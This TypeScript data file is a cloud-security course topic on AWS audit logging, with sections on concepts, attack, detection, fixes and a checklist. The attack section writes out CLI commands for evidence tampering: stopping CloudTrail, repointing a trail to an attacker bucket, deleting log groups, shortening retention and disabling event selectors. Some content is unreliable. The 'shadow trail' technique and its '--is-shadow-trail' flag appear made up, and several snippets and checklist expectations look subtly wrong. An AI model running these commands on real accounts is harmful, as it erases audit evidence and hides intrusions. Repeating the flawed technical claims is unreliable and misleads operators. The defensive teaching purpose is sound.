import type { Topic } from '@/types'

export const topic: Topic = {
  slug: 'aws/operator/logging-and-audit',
  title: 'Logging and audit trails',
  cloud: 'aws',
  stage: 'operator',
  track: 'Observability',
  summary:
    'What CloudTrail, CloudWatch Logs, Config and GuardDuty each record, where the gaps are, and how to keep an attacker from deleting the trail behind them.',
  duration: '35 min',
  difficulty: 3,
  prerequisites: ['aws/foundation/identity-and-trust'],
  enables: [
    'aws/adversary/credential-discovery',
    'aws/expert/cloudtrail-forensics',
    'aws/redteam/attack-path-chaining',
  ],
  mentalModel:
    'Audit coverage is a set of independent switches, not one setting. A trail without data events, a log group without retention, and a detector in one region all produce the same illusion: everything looks fine.',
  concept: {
    body: `AWS gives you four overlapping audit sources. They record different things, and the gaps between them are where attacks hide.

**CloudTrail** is the API audit log. It is the record of *who called which API*. It comes in three flavours:

- *Management events* — calls to control-plane APIs such as IAM, EC2, S3 bucket configuration, Lambda function creation. These are recorded by default once a trail exists, in every region the trail covers.
- *Data events* — calls to individual objects or resources, such as S3 \`GetObject\`, Lambda \`InvokeFunction\`, DynamoDB item operations. These are **not** recorded by default. Each one must be explicitly selected, and the S3 ones need per-bucket configuration.
- *Network activity events* — a newer CloudTrail feature that records network-level activity for services such as VPC, DNS, Route 53 and Network Firewall.

A trail is a configuration that writes log files to an S3 bucket. A *multi-region* trail writes events from every region into that bucket; an *organization trail* does the same across every account in the organization, delivered to a central bucket. *Log file validation* adds a digest file and a signature to each batch so you can prove the log was not modified after AWS wrote it.

**CloudWatch Logs** is where you make CloudTrail queryable. A trail can deliver to CloudWatch Logs directly, and the CloudTrail event fields become Logs Insights fields: \`eventName\`, \`eventSource\`, \`userIdentity.arn\`, \`sourceIPAddress\`, \`errorCode\`, \`requestParameters\`, \`responseElements\`. Log groups have a retention period, and the default is *never expire* — which is usually a good thing for audit and a bad thing for cost, so decide explicitly. CloudWatch Logs also has *metric filters* that turn a log pattern into a metric, which is how you turn a specific API call into an alarm.

**AWS Config** records the *configuration state* of resources over time, not events. It answers "was this security group open in March" when CloudTrail can only answer "was it changed in March". It is regional, it needs a recorder, and it is the tool for compliance-style continuous monitoring.

**GuardDuty** is the anomaly layer. It consumes CloudTrail, VPC Flow Logs and DNS logs, and adds runtime monitoring for EC2, ECS, EKS and Lambda. It produces findings with a severity, an evidence list and an affected resource. Its most valuable output for an attacker is not the finding but the fact that it ran at all — a disabled detector is a signal in itself.

The structural requirement underneath all of this: **the log destination must be somewhere the attacker cannot write to.** A trail in the same account as the workload, writing to a bucket in that account, is one \`s3:DeleteBucket\` away from not existing. Central account, separate bucket, object lock, and an SCP that denies the workload accounts permission to modify the trail.`,
    keyPoints: [
      'CloudTrail management events are on by default once a trail exists. Data events are not, and S3 data events need per-bucket configuration.',
      'A single-region trail records one region. A multi-region trail records all of them into one place.',
      'CloudWatch Logs retention defaults to never expire. Set it deliberately; audit retention has legal minimums.',
      'AWS Config records configuration state over time, which is the only way to answer what a resource looked like on a past date.',
      'GuardDuty detects anomalies; its absence is indistinguishable from a quiet account unless you check that the detector exists.',
      'Log file validation with digests and signatures is what lets you prove a log file was not edited after AWS wrote it.',
    ],
    misconceptions: [
      {
        claim: 'CloudTrail records everything that happens in the account.',
        truth:
          'It records API calls, and only the categories of call you have selected. Object reads inside S3, Lambda invocations and DynamoDB item operations are data events and are off unless you turn them on.',
      },
      {
        claim: 'Audit logs are safe because they are in the same account as the workload.',
        truth:
          'They are only safe if the account being audited cannot delete them. A compromised workload account with s3:DeleteBucket or cloudtrail:StopLogging can erase the evidence of how it got there.',
      },
      {
        claim: 'CloudTrail shows what a workload did inside the workload.',
        truth:
          'CloudTrail shows API calls. It does not show commands run in a shell, files read, or outbound connections — that is CloudWatch Logs from the workload, VPC Flow Logs for the network, and GuardDuty runtime monitoring for the process.',
      },
    ],
  },
  attack: {
    body: `An attacker in a mature AWS account knows that the CloudTrail trail is the thing that will reconstruct their path. Disabling it is the highest-value anti-forensic action available, and it is a single API call.

The primary anti-forensic techniques:

**Stop or delete the trail.** \`cloudtrail:StopLogging\` pauses delivery. \`cloudtrail:DeleteTrail\` removes the trail entirely. \`cloudtrail:UpdateTrail\` can repoint the trail at a different bucket — one the attacker controls, or one the audit will not look at. \`cloudtrail:PutEventSelectors\` can turn off the event categories that matter.

**Modify the log destination.** If the trail writes to an S3 bucket in the same account, \`s3:PutBucketPolicy\` or \`s3:DeleteBucket\` on that bucket is enough. If the trail writes to CloudWatch Logs, \`logs:DeleteLogGroup\` or \`logs:PutRetentionPolicy\` with a one-day retention destroys the history over time.

**Create an unattributable trail.** \`cloudtrail:CreateTrail\` with \`--is-shadow-trail\` creates a multi-region trail in the *organization's* home region. Shadow trails have a special CloudTrail user identity and can deliver to a bucket the attacker chooses, so they can receive the logs of every account without being visible in the individual accounts. This is the most under-used anti-forensic technique in AWS and it is documented by AWS itself.

**Work in an unlogged region.** Creating a resource in a region with no trail produces no management events at all.

**Use the data path that is not logged.** If S3 data events are off, reading every object in a bucket produces nothing in CloudTrail beyond the occasional \`GetObject\` if data events happen to be enabled.

**Blend in.** Noise generation — making many benign API calls so the malicious ones are lost in the volume — works against human review, though not against a well-written query.`,
    techniques: [
      {
        name: 'Stop the trail',
        what: 'Pause CloudTrail delivery without removing the trail.',
        command: 'aws cloudtrail stop-logging --name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail',
        impact:
          'No further events are recorded for that trail. The trail configuration survives, so a later audit can see the gap in the file sequence.',
      },
      {
        name: 'Repoint the trail at a bucket the attacker controls',
        what: 'Change where the trail writes its log files.',
        command:
          'aws cloudtrail update-trail --name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail --s3-bucket-name attacker-bucket',
        impact:
          'The trail keeps running and the console still shows it as healthy, but the events land somewhere the auditor is not reading.',
      },
      {
        name: 'Create an organization shadow trail',
        what: 'Create a multi-region, organization-wide trail from a member account.',
        command:
          'aws cloudtrail create-trail --name shadow-trail --s3-bucket-name attacker-bucket \\\n  --is-multi-region-trail --include-global-service-events --is-shadow-trail',
        impact:
          'A shadow trail receives events from every account in the organization and delivers them to the chosen bucket. The attacker sees everything, including the organisation\'s activity, without appearing in the member accounts.',
      },
      {
        name: 'Delete the log group',
        what: 'Remove a CloudWatch Logs group that holds the trail.',
        command:
          'aws logs delete-log-group --log-group-name /aws/cloudtrail/us-east-1/123456789012',
        impact:
          'The queryable history is gone. CloudTrail still writes the raw files to S3, so this is a speed bump rather than a permanent erase — unless the S3 bucket is also writable.',
      },
      {
        name: 'Shorten retention to erase history gradually',
        what: 'Set a one-day retention on the audit log group.',
        command:
          'aws logs put-retention-policy --log-group-name /aws/cloudtrail/us-east-1/123456789012 --retention-in-days 1',
        impact:
          'History expires on a schedule that looks like normal log hygiene, and nobody notices the gap until someone asks for a date six months ago.',
      },
      {
        name: 'Turn off the event selectors that matter',
        what: 'Narrow what the trail records.',
        command:
          'aws cloudtrail put-event-selectors --trail-name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail \\\n  --event-selectors \'[{"ReadWriteType":"All","IncludeManagementEvents":false,"DataResources":[]}]\'',
        impact:
          'The trail keeps recording something, so it still looks configured, but the API calls that reveal the compromise are no longer captured.',
      },
    ],
    cases: [
      {
        title: 'Audit trail tampering to delay discovery',
        source: 'Recurring pattern in published cloud incident retrospectives and breach write-ups',
        impact:
          'In the recurring pattern, the log trail was disabled or the log destination modified shortly after the initial compromise, extending the dwell time from hours to weeks. The eventual detection came from an external source rather than from the account\'s own logging.',
        year: 2021,
      },
    ],
  },
  detect: {
    body: `Detecting anti-forensic activity requires the audit trail to live somewhere the attacker cannot reach. If it does, the tampering itself is the most reliable signal you have.

Five things to watch for:

**Trail lifecycle events.** \`StopLogging\`, \`DeleteTrail\`, \`UpdateTrail\`, \`CreateTrail\`, \`PutEventSelectors\`, \`AddTags\` on a trail. A trail being stopped is unambiguous. A trail being *created* by a principal that does not own the audit account is worth a page.

**Log destination changes.** \`s3:PutBucketPolicy\` on the trail bucket, \`s3:DeleteBucket\`, \`logs:DeleteLogGroup\`, \`logs:PutRetentionPolicy\`.

**Coverage gaps.** Periodically diff the enabled regions against the multi-region trail, and diff the list of accounts against the organization trail. A member account that is not in the organization trail's home account list has no audit.

**Detector presence.** \`guardduty list-detectors\` per region. Also check that CloudTrail is still delivering: \`cloudtrail get-trail-status\` returns \`IsLogging\`, \`LatestDeliveryTime\` and \`StartLoggingTime\`. A trail that is configured but has not delivered in hours is broken, not quiet.

**Config recorder status.** \`aws configservice describe-configuration-recorders\` — a recorder that has stopped means the historical configuration record stops as well.`,
    signals: [
      {
        signal: 'CloudTrail logging stopped or a trail deleted',
        source: 'CloudTrail — management events',
        query: `fields @timestamp, eventName, userIdentity.arn, requestParameters.name\n| filter eventName = "StopLogging" or eventName = "DeleteTrail"\n| stats count() by eventName, userIdentity.arn, requestParameters.name`,
        note:
          'There is no benign reason for a workload account to stop a trail. If a deployment account does it, the trail should not be there in the first place — use an organization trail.',
      },
      {
        signal: 'A trail was created, updated or had its event selectors changed',
        source: 'CloudTrail — management events',
        query: `fields @timestamp, eventName, userIdentity.arn, requestParameters.name, requestParameters.s3BucketName\n| filter eventName = "CreateTrail" or eventName = "UpdateTrail" or eventName = "PutEventSelectors"\n| stats count() by eventName, userIdentity.arn, requestParameters.name`,
        note:
          'A new bucket name in an UpdateTrail event is the classic repoint. A trail created from a member account deserves special attention because it may be a shadow trail.',
      },
      {
        signal: 'Log group deleted or retention shortened',
        source: 'CloudTrail — management events',
        query: `fields @timestamp, eventName, userIdentity.arn, requestParameters.logGroupName, requestParameters.retentionInDays\n| filter eventName = "DeleteLogGroup" or eventName = "PutRetentionPolicy"\n| stats count() by eventName, userIdentity.arn, requestParameters.logGroupName`,
        note:
          'Shortening retention on an audit log group is the quiet version of log deletion. Alert on any change to retention on a log group whose name starts with /aws/cloudtrail.',
      },
      {
        signal: 'Trail health check',
        source: 'CloudTrail API — trail status',
        query: `aws cloudtrail get-trail-status --name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail`,
        note:
          'IsLogging must be true and LatestDeliveryTime must be recent. Run this on a schedule; a silently broken trail looks identical to a quiet account.',
      },
      {
        signal: 'Detector and recorder presence across regions',
        source: 'GuardDuty and AWS Config APIs',
        query: `for r in us-east-1 eu-west-1 eu-central-1 ap-south-1; do echo -n "$r detector: "; aws guardduty list-detectors --region $r --query "DetectorIds" --output text; echo -n "$r recorder: "; aws configservice describe-configuration-recorders --region $r --query "ConfigurationRecorders[].name" --output text; done`,
        note:
          'A detector or recorder that disappears from one region while the others remain is a strong tamper signal.',
      },
      {
        signal: 'Guardrail — deny trail modification outside the log archive account',
        source: 'AWS Organizations SCP',
        query: `SCP Deny: cloudtrail:StopLogging, cloudtrail:DeleteTrail, cloudtrail:UpdateTrail, cloudtrail:PutEventSelectors, cloudtrail:CreateTrail in every account except the log archive account`,
        note:
          'This is the control that makes trail tampering impossible rather than merely detectable.',
      },
    ],
    posture: [
      'One organization trail, multi-region, delivering to a log archive account that no workload account can write to.',
      'Enable log file validation so each batch carries a digest and a signature.',
      'Put an object lock in compliance mode on the trail bucket so logs cannot be deleted before their retention period.',
      'Enable S3 data events for every bucket that holds sensitive data, and Lambda data events for every function.',
      'Set an explicit, long retention on the audit log group and never reduce it.',
      'Enable GuardDuty and AWS Config in every region the account can use, and check the detector list on a schedule.',
      'Enable CloudTrail Insights for API call rate and API error rate anomalies — it catches automation that a rule-based alert would miss.',
    ],
  },
  fix: {
    body: `Audit logging is unusual among security controls: it is cheap to get right and the failure mode is total silence. The work is mostly configuration plumbing, and it is best done once, centrally, for the whole organization.

The design that holds up:

1. **One log archive account.** It owns the trail bucket, the log group, and the GuardDuty detector delegation. It has a small set of humans and a tightly scoped break-glass role.
2. **An organization trail** with log file validation, delivering to that account, with S3 data events configured per bucket and Lambda data events enabled globally.
3. **An SCP** in every other account that denies the trail-management actions outright.
4. **Retention set deliberately** — long on the log group, enforced by object lock on the bucket, and a documented schedule for lifecycle transition to Glacier.
5. **A health check**, because a trail that stopped delivering for a week is a silent failure that no alert will catch unless something checks.

The last piece is a monthly review of what the trail actually contains. A trail that logs 400 events a day because data events were never enabled is not audit coverage, and it is worth catching.'`,
    remediations: [
      {
        priority: 'critical',
        action: 'Create a log archive account and put an organization trail there',
        detail:
          'The trail bucket lives in an account that workload accounts have no write access to. Without this separation, a single compromised account can remove the evidence of its own compromise.',
        snippet: `aws cloudtrail create-trail --name org-trail --s3-bucket-name central-trail-bucket \\\n  --is-multi-region-trail --include-global-service-events \\\n  --is-log-file-validation-enabled --s3-bucket-policy-filename file://trail-bucket-policy.json`,
        snippetLang: 'bash',
      },
      {
        priority: 'critical',
        action: 'Deny trail management in every account except the log archive',
        detail:
          'StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors and CreateTrail are all single-call wins for an attacker. An SCP removes them from the adversary\'s toolkit entirely.',
        snippet: `{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Action": ["cloudtrail:StopLogging", "cloudtrail:DeleteTrail", "cloudtrail:UpdateTrail",
               "cloudtrail:PutEventSelectors", "cloudtrail:CreateTrail"],
    "Resource": "*"
  }]
}`,
        snippetLang: 'json',
      },
      {
        priority: 'high',
        action: 'Enable S3 and Lambda data events',
        detail:
          'Without data events, object reads and function invocations are invisible. S3 data events must be selected per bucket; Lambda data events are configured once for the whole account.',
        snippet: `aws cloudtrail put-event-selectors --trail-name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail \\\n  --event-selectors \'[{"ReadWriteType":"All","IncludeManagementEvents":true,"DataResources":[{"Type":"AWS::S3::Object","Values":["arn:aws:s3:::"]}]}]\''`,
        snippetLang: 'bash',
      },
      {
        priority: 'high',
        action: 'Set an explicit retention and protect the trail bucket with object lock',
        detail:
          'Retention defaults to never expire, which is safe but unbounded; set it deliberately to match your legal and regulatory minimum. Object lock in compliance mode means even a privileged administrator cannot shorten it.',
        snippet: `aws logs put-retention-policy --log-group-name /aws/cloudtrail/us-east-1/123456789012 --retention-in-days 365`,
        snippetLang: 'bash',
      },
      {
        priority: 'high',
        action: 'Enable GuardDuty and AWS Config in every enabled region',
        detail:
          'Both are regional and both are off by default in some cases. Automate the enablement with a StackSet so that new accounts and new regions inherit the coverage.',
      },
      {
        priority: 'medium',
        action: 'Turn on CloudTrail Insights for API call rate and error rate anomalies',
        detail:
          'Insights analyses the trail statistically and produces an event when a principal\'s call pattern deviates from its own baseline. It catches scripted abuse that a static rule would miss.',
        snippet: `aws cloudtrail create-event-data-store --name eds-anomaly --event-data-store-type EVENT_DATA_STORE --retention-period 365`,
        snippetLang: 'bash',
      },
      {
        priority: 'medium',
        action: 'Set up a scheduled trail health check',
        detail:
          'A check on IsLogging and LatestDeliveryTime catches silent breakage. Combine it with a per-region detector and recorder check, and route the results to the same alerting path as everything else.',
      },
      {
        priority: 'medium',
        action: 'Send logs to both CloudWatch Logs and S3',
        detail:
          'S3 gives you durable, queryable-with-Athena history. CloudWatch Logs gives you fast interactive queries and a place to hang metric filters and alarms. They solve different problems.',
      },
      {
        priority: 'low',
        action: 'Review what the trail actually contains every quarter',
        detail:
          'Check the event volume by category. A trail with no data events, no Insights and no global service events is a management-only log, and the report should say so.',
      },
    ],
  },
  checklist: [
    {
      id: 'log-1',
      text: 'Confirm a multi-region organization trail exists and is logging.',
      command:
        'aws cloudtrail describe-trails --region all --query "trailList[].{Name:Name,Multi:IsMultiRegionTrail,Validation:LogFileValidationEnabled,Global:IncludeGlobalServiceEvents}" && aws cloudtrail get-trail-status --name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail',
      expected:
        'IsLogging is true, LatestDeliveryTime is within the hour, and log file validation is enabled.',
    },
    {
      id: 'log-2',
      text: 'Check whether S3 data events are selected for the buckets that matter.',
      command:
        'aws cloudtrail get-event-selectors --trail-name arn:aws:cloudtrail:us-east-1:123456789012:trail/org-trail',
      expected:
        'DataResources includes the bucket ARNs you care about. An empty DataResources list means object reads are not audited.',
    },
    {
      id: 'log-3',
      text: 'Verify the audit log group retention and that it is not near expiry.',
      command:
        'aws logs describe-log-groups --log-group-name-prefix /aws/cloudtrail --query "logGroups[].{Name:logGroupName,Retention:retentionInDays,Bytes:storedBytes}"',
      expected:
        'Every trail log group has a retention of at least 365 days and is not enormous unless it is expected to be.',
    },
    {
      id: 'log-4',
      text: 'Check the trail bucket policy denies deletion from the logging account.',
      command: 'aws s3api get-bucket-policy --bucket central-trail-bucket',
      expected:
        'The policy includes an explicit Deny on s3:DeleteBucket, s3:PutBucketPolicy and s3:GetBucketPolicy for the workload account principals.',
    },
    {
      id: 'log-5',
      text: 'Confirm a GuardDuty detector exists in every enabled region.',
      command:
        'for r in us-east-1 eu-west-1 eu-central-1; do echo -n "$r: "; aws guardduty list-detectors --region $r --query "DetectorIds" --output text; done',
      expected: 'One detector id in every region you operate in.',
    },
    {
      id: 'log-6',
      text: 'Confirm the AWS Config recorder is running and recording.',
      command:
        'aws configservice describe-configuration-recorders --query "ConfigurationRecorders[].{Name:name,Group:recordingGroup}" && aws configservice describe-configuration-recording-status --query "ConfigurationRecordersStatus[].{Name:configurationRecorderName,Recording:recording}"',
      expected: 'Recording is true for every recorder in every region.',
    },
    {
      id: 'log-7',
      text: 'Search the trail for any trail-management activity in the last period.',
      command:
        'aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging --max-results 20',
      expected: 'No recent results, or only from a documented change window.',
    },
  ],
  references: [
    { label: 'AWS CloudTrail event types and data events', url: 'https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html' },
    { label: 'AWS CloudTrail log file validation', url: 'https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html' },
    { label: 'AWS CloudWatch Logs Insights query syntax', url: 'https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/CWL_QuerySyntax-Complete.html' },
    { label: 'AWS GuardDuty', url: 'https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html' },
  ],
  updated: '2026-11-20',
}
